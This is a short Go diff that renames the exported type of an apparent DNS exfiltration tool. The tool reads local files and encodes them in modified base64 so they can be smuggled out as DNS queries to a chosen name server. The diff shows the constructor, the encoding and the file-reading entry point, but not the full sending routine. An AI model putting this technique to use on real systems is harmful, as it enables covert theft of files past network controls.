@@ -21,18 +21,18 @@ const (
 	MAX_SUBDOMAIN_NAME_LENGTH = 63
 )
 
-type dnsExfiltrator struct {
+type DnsExfiltrator struct {
 	nameServer string
 	machineId  string
 	delay      int
 }
 
-func NewDnsExfiltrator(nameServer string, machineId string, delay int) *dnsExfiltrator {
+func NewDnsExfiltrator(nameServer string, machineId string, delay int) *DnsExfiltrator {
 	absoluteNameServer := nameServer
 	if nameServer[len(nameServer)-1] != '.' {
 		absoluteNameServer += "."
 	}
-	return &dnsExfiltrator{
+	return &DnsExfiltrator{
 		nameServer: absoluteNameServer,
 		machineId:  machineId,
 		delay:      delay,
@@ -45,7 +45,7 @@ func encodeToModifiedBase64(data []byte) string {
 	return strings.Replace(base64Data, "=", "-", -1)
 }
 
-func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string) {
+func (ex *DnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string) {
 	// Domain names in messages are expressed in terms of a sequence of labels.
 	// Each label is represented as a one octet length field followed by that
 	// number of octets. Since every domain name ends with the null label of
@@ -92,7 +92,7 @@ func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string)
 	}
 }
 
-func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
+func (ex *DnsExfiltrator) ExfiltrateFile(filename string) {
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
 		log.Fatalln(err)
